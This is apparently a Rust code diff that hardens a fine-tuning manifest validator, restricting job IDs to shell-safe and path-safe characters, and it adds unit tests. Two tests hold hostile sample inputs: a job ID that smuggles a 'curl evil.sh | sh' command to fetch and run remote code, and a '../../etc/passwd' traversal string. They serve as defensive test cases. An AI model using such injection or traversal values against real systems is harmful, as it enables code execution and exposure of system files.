@@ -132,6 +132,22 @@ impl FinetuneManifest {
         if self.job.id.trim().is_empty() {
             bail!("[job].id must not be empty");
         }
+        // job.id is interpolated into a `/bin/sh -c` bootstrap string
+        // (`hf_jobs_run_args`) and used as a filesystem path component
+        // (`config-<id>.yaml`, `output-<id>`). Restrict it to a
+        // path/shell-safe allowlist so a manifest can neither inject shell
+        // metacharacters into the cloud job nor traverse directories.
+        if !self
+            .job
+            .id
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
+        {
+            bail!(
+                "[job].id = {:?} has invalid characters — allowed: ASCII letters, digits, '.', '_', '-'",
+                self.job.id
+            );
+        }
         if self.job.base_model.trim().is_empty() {
             bail!("[job].base_model must not be empty");
         }
@@ -1198,6 +1214,29 @@ s3_bucket = "b00t-finetune-artifacts"
         m.job.id = "  ".to_string();
         let err = m.validate().unwrap_err().to_string();
         assert!(err.contains("[job].id"));
+    }
+
+    #[test]
+    fn rejects_job_id_with_shell_metacharacters() {
+        let mut m = FinetuneManifest::from_toml_str(sample_local_toml()).unwrap();
+        m.job.id = "x.yaml\" && curl evil.sh | sh #".to_string();
+        let err = m.validate().unwrap_err().to_string();
+        assert!(err.contains("invalid characters"), "got: {err}");
+    }
+
+    #[test]
+    fn rejects_job_id_with_path_traversal() {
+        let mut m = FinetuneManifest::from_toml_str(sample_local_toml()).unwrap();
+        m.job.id = "../../etc/passwd".to_string();
+        let err = m.validate().unwrap_err().to_string();
+        assert!(err.contains("invalid characters"), "got: {err}");
+    }
+
+    #[test]
+    fn accepts_normal_job_id() {
+        let mut m = FinetuneManifest::from_toml_str(sample_local_toml()).unwrap();
+        m.job.id = "qwen38-peer-2026-09-01.v2".to_string();
+        assert!(m.validate().is_ok());
     }
 
     #[test]
